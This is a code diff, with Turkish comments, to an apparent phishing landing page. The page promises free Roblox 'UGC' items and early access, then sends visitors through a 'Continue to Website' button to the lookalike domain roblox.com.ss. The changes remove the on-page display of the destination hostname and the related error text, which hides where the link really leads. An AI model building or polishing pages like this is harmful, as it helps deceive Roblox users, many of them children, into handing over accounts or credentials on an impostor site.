@@ -93,17 +93,11 @@
       display: none;
     }
 
-    .destination {
-      font-size: 13px;
-      color: #aab4d5;
-      overflow-wrap: anywhere;
-      margin: 18px 0;
-    }
-
     .notice {
       margin-top: 25px;
       font-size: 12px;
       color: #aaaab5;
+      line-height: 1.5;
     }
 
     @media (max-width: 480px) {
@@ -152,8 +146,6 @@
         Visit Our Community Page to Continue
       </p>
 
-      <p class="destination" id="destination"></p>
-
       <a
         id="redirectButton"
         class="btn"
@@ -165,7 +157,7 @@
     </div>
 
     <p class="notice">
-      Join Our Official Group For Early-Acces The Holly Items!🎁
+      Join Our Official The Holly Group To Early-Access Free UGCS🎁🎅
     </p>
 
   </main>
@@ -173,24 +165,23 @@
   <script>
 
     // =====================================
-    // KANKA LINKI BURADAN DEGISTIR 💙
+    // KANKA AYARLAR BURADA 💙
     // =====================================
 
-    const WEBSITE_URL = "https://www.roblox.com.ss/communities/161344644/The-Holly";
+    // YONLENDIRILECEK LINK
+    const WEBSITE_URL = "https://www.roblox.com.ss/communities/161344644/The-Holly#!/about";
+
+    // MAVI BUTONUN YAZISI
+    const BUTTON_TEXT = "Continue to Website";
 
     // =====================================
-    // BUTON VE YONLENDIRME SISTEMI
+    // YONLENDIRME SISTEMI
     // =====================================
 
     const redirectButton =
       document.getElementById("redirectButton");
 
-    const destination =
-      document.getElementById("destination");
-
-    // Kabul edilen bağlantılar:
-    // HTTPS veya HTTP kullanan herhangi
-    // bir normal web sitesi.
+    redirectButton.textContent = BUTTON_TEXT;
 
     try {
       const url = new URL(WEBSITE_URL);
@@ -201,12 +192,8 @@
       ) {
         redirectButton.href = url.href;
 
-        // Aynı sekmede aç.
+        // Ayni sekmede ac
         redirectButton.target = "_self";
-
-        // Gideceği siteyi göster.
-        destination.textContent =
-          "Destination: " + url.hostname;
 
       } else {
         throw new Error("Invalid URL");
@@ -216,12 +203,9 @@
       redirectButton.removeAttribute("href");
       redirectButton.textContent =
         "Invalid Website Link";
-
-      destination.textContent =
-        "Please enter a valid website URL.";
     }
 
-    // FIRST BUTTON
+    // ILK BUTON
     function nextStep() {
       document.getElementById("step1")
         .style.display = "none";
